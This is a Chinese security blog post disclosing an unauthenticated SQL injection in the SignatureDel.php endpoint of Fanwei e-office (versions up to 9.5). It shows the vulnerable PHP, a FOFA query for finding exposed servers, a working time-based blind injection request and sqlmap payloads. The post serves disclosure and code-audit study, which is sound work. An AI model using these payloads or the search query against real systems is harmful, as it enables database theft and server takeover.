---
title: "泛微e-office SignatureDel.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-Signature-SignatureDel-SignatureID-sqli.html
asset_dir: assets/泛微e-office-signaturedel.php-sql注入漏洞
---

# 泛微e-office SignatureDel.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/16 08:30
- 1369浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

安全研究报告

文件大小转换

Nessus

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `SignatureDel.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

代码安全审计

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

直接看 `iWebOffice/Signature/SignatureDel.php` 的关键业务实现逻辑

```
<?php

$mSignatureID = $SignatureID;
include_once( "inc/conn.php" );
$query = " \r\n\t\t\t\tSELECT MarkFile FROM  Signature\r\n\t\t\t\t\twhere SignatureID={$mSignatureID}\r\n\t\t\t\t";
$res = ( $connection, $query );
$ROW = ( $res );
$MarkFile = $ROW['MarkFile'];
$MarkFile_Del = ( "UTF-8", "GB2312", $MarkFile );
$Del_Dir = $_SERVER['DOCUMENT_ROOT']."/attachment/".$MarkFile_Del;
@( $Del_Dir );
$query = "Delete from Signature where SignatureID=".$mSignatureID;
( $query );
( "location:SignatureList.php" );
?>
```

深入探索

计算机安全

授权

SQL

`$mSignatureID=$SignatureID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+7431+FROM+(SELECT(SLEEP(5)))LtXU) HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功延时 10 秒（执行两次sql）

漏洞预警服务

[![泛微e-office SignatureDel.php sql注入漏洞](images/img-001-b97dd89758cf.webp)](https://image.mrxn.net/70952b29bc4f4e8d961dbb270b6d76aa.webp)

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: SignatureID=1 RLIKE (SELECT (CASE WHEN (8174=8174) THEN 1 ELSE 0x28 END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: SignatureID=1 AND (SELECT 7431 FROM (SELECT(SLEEP(5)))LtXU)
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
